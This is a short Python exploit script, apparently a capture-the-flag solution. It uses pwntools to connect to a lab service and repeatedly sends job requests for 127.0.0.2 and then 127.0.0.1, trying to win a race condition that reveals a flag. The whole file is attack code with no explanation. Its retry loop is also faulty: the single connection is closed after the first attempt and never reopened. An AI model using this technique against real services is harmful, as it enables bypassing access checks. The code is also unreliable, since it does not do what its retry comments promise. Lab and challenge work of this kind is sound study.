#!/usr/bin/env python3
from pwn import *
import time
import re

HOST = 'up.zoolab.org'
PORT = 10932

# Set context to suppress info-level messages like connection status
context.log_level = 'warning'

io = None
match = False

# Connect
io = remote(HOST, PORT, timeout=2)

# Race conditions might require multiple attempts
MAX_RETRIES = 50
for attempt in range(MAX_RETRIES):
    print("------  Attempt " + str(attempt) + "  ------")
    try:
        io.sendline(b'g')
        io.sendline(b'127.0.0.2/10000')
        io.sendline(b'g')
        io.sendline(b'127.0.0.1/10000')
        io.sendline(b'v')

        # Receive and print the status report
        io.recvuntil(b'==== Job Status ====\n\n')
        status1 = io.recvline().decode().strip()
        status2 = io.recvline().decode().strip()

        print(f"  {status1}")
        print(f"  {status2}")

        match = 'FLAG' in status1 or 'FLAG' in status2
        if match:
            break

    except Exception as e:
        if io and not io.closed:
            io.close()
    finally:
        if io and not io.closed:
            io.close()

    if match:
        break

    # Wait a tiny bit before retrying if flag wasn't found
    # time.sleep(0.2)


if not match:
    print("Failed to retrieve the flag after multiple attempts.") # Optional: indicate final failure

# --- End of script ---